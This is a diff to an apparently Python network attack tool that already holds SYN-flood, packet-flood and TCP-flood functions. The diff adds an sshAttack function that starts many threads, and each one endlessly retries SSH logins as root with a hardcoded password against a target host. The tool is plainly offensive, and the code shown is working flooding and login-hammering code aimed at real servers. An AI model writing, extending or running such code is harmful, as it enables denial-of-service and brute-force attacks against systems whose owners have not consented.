@@ -7,7 +7,7 @@ from socket import *
 from time import sleep
 from urllib import request
 from urllib.request import Request
-
+from paramiko import SSHClient
 import impacket.ImpactPacket
 import warnings
 from scapy.layers.inet import TCP, IP
@@ -57,7 +57,6 @@ def isSnull(string: str):
 
 
 def synAttack(urip, sourceport, tgtip, tgtport, thread):
-
     noPolIp = str(tgtip).replace('https://', '').replace('http://', '')
     tgtip = gethostbyname(noPolIp)
     warnings.filterwarnings("ignore")
@@ -244,6 +243,23 @@ def sendPacketAttack(host: list, thread: int, failnum: int = 15):
         for i in range(1, thread + 1):
             _thread.start_new_thread(get, (a, headers))
     sleep(0)
+
+
+def sshAttack(host, port, thread):
+    colormsg("Thread Start!", "yellow")
+
+    def get(host, port):
+        while True:
+            try:
+                SSHClient().connect(hostname=host, port=port, username="root", password='1145141919810FUCKU')
+                colormsg("Success", 'green')
+            except Exception as e:
+                colormsg(f"Failed.{e}", 'red')
+            finally:
+                sleep(0)
+
+    for i in range(1, thread + 1):
+        _thread.start_new_thread(get, (host, port,))
 
 
 def tcpAttack(host: tuple, thread: int, num: int = 50):
